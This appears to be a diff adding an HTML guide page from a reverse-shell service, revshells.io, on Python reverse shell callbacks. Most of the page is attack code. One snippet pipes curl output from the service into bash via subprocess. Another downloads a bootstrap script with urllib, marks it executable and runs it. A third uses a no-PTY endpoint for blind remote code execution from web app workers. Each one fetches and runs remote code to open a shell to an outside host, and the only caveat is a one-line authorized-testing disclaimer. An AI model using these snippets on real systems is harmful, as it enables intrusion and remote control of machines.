@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Python reverse shell callbacks | revshells.io</title>
+<meta name="description" content="Reverse shell Python workflows on revshells.io: subprocess curl bootstrap, urllib download, and attach from browser or rsctl without a custom listener.">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://revshells.io/articles/python-reverse-shell">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="revshells.io">
+<meta property="og:title" content="Python reverse shell callbacks | revshells.io">
+<meta property="og:description" content="Reverse shell Python workflows on revshells.io: subprocess curl bootstrap, urllib download, and attach from browser or rsctl without a custom listener.">
+<meta property="og:url" content="https://revshells.io/articles/python-reverse-shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python reverse shell callbacks | revshells.io">
+<meta name="twitter:description" content="Reverse shell Python callbacks via subprocess or urllib on revshells.io.">
+<!-- __ANALYTICS_LOCAL__ -->
+<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+<link rel="stylesheet" href="/static/common.css">
+</head>
+<body>
+<header class="topbar">
+  <a href="/" class="brand">
+    <div class="brand-logo">rsd</div>
+    <div class="brand-text">
+      <span class="brand-name">revshells.io</span>
+      <span class="brand-version" id="rsd-version">v0.0.0</span>
+    </div>
+  </a>
+  <div class="topbar-actions">
+    <a href="/articles" class="btn">Guides</a>
+    <a href="/" class="btn btn-primary">Create session</a>
+    <button type="button" class="btn icon-btn" id="theme-toggle" title="Toggle theme">☀️</button>
+  </div>
+</header>
+
+<main class="article-main">
+  <h1>Python reverse shell with revshells.io</h1>
+  <p class="article-lead">A reverse shell Python snippet usually opens a socket back to your IP. With revshells.io you keep the Python trigger minimal — fetch your session bootstrap over HTTPS and let <code>rs-agent</code> handle the interactive shell.</p>
+
+  <h2>1. Create a session</h2>
+  <p>Create a session at <a href="/">revshells.io</a> and note the session ID.</p>
+
+  <h2>2. Subprocess + curl (simplest)</h2>
+  <pre>import subprocess
+subprocess.call(
+    "curl -fsSL https://revshells.io/SESSION-ID/revshell | bash",
+    shell=True,
+)</pre>
+
+  <h2>3. urllib bootstrap download</h2>
+  <p>When you cannot shell out to curl but can make HTTPS requests:</p>
+  <pre>import os, stat, subprocess, tempfile, urllib.request
+
+url = "https://revshells.io/SESSION-ID/revshell"
+script = urllib.request.urlopen(url, timeout=30).read()
+path = os.path.join(tempfile.gettempdir(), "rs-bootstrap.sh")
+with open(path, "wb") as f:
+    f.write(script)
+os.chmod(path, stat.S_IRWXU)
+subprocess.Popen(["/bin/bash", path])</pre>
+
+  <h2>4. No-PTY for blind RCE</h2>
+  <p>Use <code>/nopty</code> when executing from a web app worker with no TTY:</p>
+  <pre>subprocess.call(
+    "curl -fsSL https://revshells.io/SESSION-ID/nopty | bash",
+    shell=True,
+)</pre>
+
+  <h2>5. Attach</h2>
+  <p>When the agent callbacks, use the revshells.io session terminal or <code>rsctl attach SESSION-ID</code> for a full PTY experience.</p>
+
+  <nav class="article-nav">
+    <a class="btn" href="/articles/php-reverse-shell">← PHP guide</a>
+    <a class="btn" href="/articles/javascript-reverse-shell">JavaScript guide →</a>
+  </nav>
+
+  <p class="article-disclaimer">For authorized security testing, CTFs, and lab environments only.</p>
+</main>
+
+<script>window.RSD_VERSION = '__RSD_VERSION__';</script>
+<script src="/static/common.js"></script>
+<script>rsdInitTopbar();</script>
+</body>
+</html>
